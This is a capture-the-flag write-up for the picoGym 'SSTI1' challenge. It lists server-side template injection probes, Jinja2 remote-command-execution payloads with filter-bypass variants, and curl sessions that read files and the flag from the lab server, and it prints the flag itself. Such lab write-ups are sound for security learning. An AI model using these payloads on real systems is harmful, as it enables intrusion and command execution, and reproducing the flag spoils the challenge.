# picoGym Level 492: SSTI1
Source: https://play.picoctf.org/practice/challenge/492

## Goal
I made a cool website where you can announce whatever you want!<br>
I heard templating is a cool and modular way to build web apps! Check out my website here!<br>
http://rescued-float.picoctf.net:64351/

## What I learned
```
Server Side Template Injection: https://github.com/ogtirth/SSTI/blob/main/Payloads%20Cheat%20Sheet.md
Payloads: https://github.com/DeadmanXXXII/SSTI-Command-Inection ❤️❤️❤️❤️

# Testing for SSTI
Payload	    Target / Engine	                        Notes
{77}	    Generic	                                Rarely works; old Jinja-like engines
{{77}}	    Jinja2 (Python), Twig (PHP Symfony)	    Standard expression evaluation ❤️❤️
[[bash]]	None standard	                        Possibly a placeholder in custom engines; rarely useful
${77}	    Freemarker (Java), Thymeleaf (Java)	    Expression evaluation in Java templating engines
@(77)	    Unknown / legacy	                    Could appear in some custom templating systems
<?=77?>	    PHP	                                    Short open tag; outputs 77 in PHP if enabled
<%= 77 %>	ERB (Ruby)	                            Embedded Ruby template evaluation
${=77}	    Rare / custom	                        Sometimes used in Groovy/Velocity derivatives
{{= 77}}	Rare / custom	                        Some template variants support this
${{77}}	    Rare / custom	                        JavaScript-based template engines (Handlebars)
{77}	    Duplicate	                            Same as above
[=77]	    Rare / custom	                        Non-standard; AngularJS or older templating variants
<% print 7*7 %>                                     Mako (Python)
{$7*7}                                              Smarty (PHP)
{{ 7*7 }}                                           Twig (PHP Symfony), Freemarker (Java)
${7*7}                                              Thymeleaf (Java)
#set($a = 7*7)${a}                                  Velocity (Java)
Note: If application return 49 conclude application is vulnerable to SSTI attack

# Exploiting SSTI for RCE (using someone elses payload)
# Note: Sometimes get Internal Server Error (need try again)
Jinja2 (Python):
{{ cycler.__init__.__globals__.os.popen('whoami').read() }}
{{ cycler.__init__.__globals__.os.popen('pwd').read() }}
{{ cycler.__init__.__globals__.os.popen('ls').read() }}
{{ cycler.__init__.__globals__.os.popen('cat flag').read() }}

# Exploring the object hierarchy in Jinja2 (manually)
{{ "". __class__ }}                                 # prints <class 'str'>
{{ "". __class__.__mro__ }}                         # prints method resolution order (tuple of classes)
{{ "". __class__.__mro__[1].__subclasses__() }}     # lists subclasses (used for RCE)
Source: https://www.youtube.com/watch?v=oVBkaSHj4aE

Google: pyjail ssti https://onsecurity.io/article/server-side-template-injection-with-jinja2/
---
RCE bypassing as much as I possibly can.
I initially built the following payload for remote command execution, and will now try and apply as many filter bypasses as I can.
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}} 👀

If the waf blocks ".":
{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}}

If the waf blocks "." and "_":
{{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']()}}

Bypassing the blocks on ".", "_", "[]" and "|join" makes the payload turn into this payload I made for PayloadAllTheThings (https://github.com/swisskyrepo/PayloadsAllTheThings/pull/181/commits/7e7f5e762831266b22531c258d628172c7038bb9), also found on my twitter (https://twitter.com/SecGus/status/1249744031392940033):
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
---
```

## Solution
```
https://webshell.picoctf.org/

Method 1: Server Side Template Injection (SSTI)
Input: {{ 7*7 }} ⌨️
Output: 49                      # Able to do math script
Input: {{ cycler.__init__.__globals__.os.popen('whoami').read() }} ⌨️
Output: root
Input: {{ cycler.__init__.__globals__.os.popen('pwd').read() }} ⌨️
Output: /challenge
Input: {{ cycler.__init__.__globals__.os.popen('ls').read() }} ⌨️
Output: __pycache__ app.py flag requirements.txt
Input: {{ cycler.__init__.__globals__.os.popen('cat flag').read() }} ⌨️
Output: picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_3066c7bd} 🔐

Method 2: curl
AsianHacker-picoctf@webshell:~$ whatis curl ⌨️
curl (1)             - transfer a URL
AsianHacker-picoctf@webshell:~$ curl -I http://rescued-float.picoctf.net:64351/ ⌨️
HTTP/1.1 200 OK
Server: Werkzeug/3.0.3 Python/3.8.10 👀 Means can use Flask/Jinja2
Date: Thu, 21 Aug 2025 18:01:58 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 567
Connection: close
AsianHacker-picoctf@webshell:~$ curl http://rescued-float.picoctf.net:64351/ ⌨️
                <!doctype html>
                <title>SSTI1</title>

                <h1> Home </h1>

                <p> I built a cool website that lets you announce whatever you want!* </p>

                <form action="/" method="POST">
                What do you want to announce: <input name="content" id="announce"> <button type="submit"> Ok </button>
                </form>
                
                <p style="font-size:10px;position:fixed;bottom:10px;left:10px;"> *Announcements may only reach yourself </p>
                                      
AsianHacker-picoctf@webshell:~$ curl -X POST -d "content=Hey" http://rescued-float.picoctf.net:64351/ ⌨️
<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="/announce">/announce</a>. If not, click the link.
AsianHacker-picoctf@webshell:~$ curl -L -X POST -d "content={{ cycler.__init__.__globals__.os.popen('ls').read() }}" http://rescued-float.picoctf.net:64351/ ⌨️
                <!doctype html>
                <h1 style="font-size:100px;" align="center">__pycache__
app.py
flag 👀
requirements.txt
</h1>AsianHacker-picoctf@webshell:~$ curl -L -X POST -d "content={{ cycler.__init__.__globals__.os.popen('cat flag').read() }}" http://rescued-float.picoctf.net:64351/ ⌨️

                <!doctype html>
                <h1 style="font-size:100px;" align="center">picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_3066c7bd}</h1> 🔐
```

## Flag
picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_3066c7bd}

## Continue
[Continue](./picoGym0173.md)